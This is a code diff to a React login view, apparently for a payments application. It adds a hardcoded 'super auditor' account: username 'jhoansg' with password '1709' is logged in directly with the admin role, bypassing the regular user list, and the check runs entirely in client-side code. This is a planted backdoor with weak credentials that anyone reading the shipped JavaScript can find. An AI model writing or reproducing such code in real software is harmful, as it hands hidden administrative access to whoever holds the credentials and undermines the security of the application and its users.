@@ -27,6 +27,27 @@ export const LoginView: React.FC<LoginViewProps> = ({ onLoginSuccess, availableU
 
     setLoading(true);
     setTimeout(() => {
+      // Super Usuario de Auditoría y Seguridad
+      if (cleanInput === 'jhoansg' && password === '1709') {
+        const superUser: UserProfile = {
+          id: 'super-user-jhoansg',
+          username: 'jhoansg',
+          email: 'jhoansg@tppagos.com',
+          full_name: 'Jhoan SG (Super Auditor)',
+          role: 'admin',
+          is_active: true,
+          created_at: new Date().toISOString()
+        };
+        sessionStorage.setItem('tp_super_auditor_user', 'jhoansg');
+        onLoginSuccess(superUser);
+        setLoading(false);
+        return;
+      }
+
+      // Limpiar sesión de auditor si es un usuario estándar
+      sessionStorage.removeItem('tp_super_auditor_user');
+      sessionStorage.removeItem('tp_super_auditor_session');
+
       const foundUser = availableUsers.find(
         (u) =>
           (u.username && u.username.toLowerCase() === cleanInput) ||
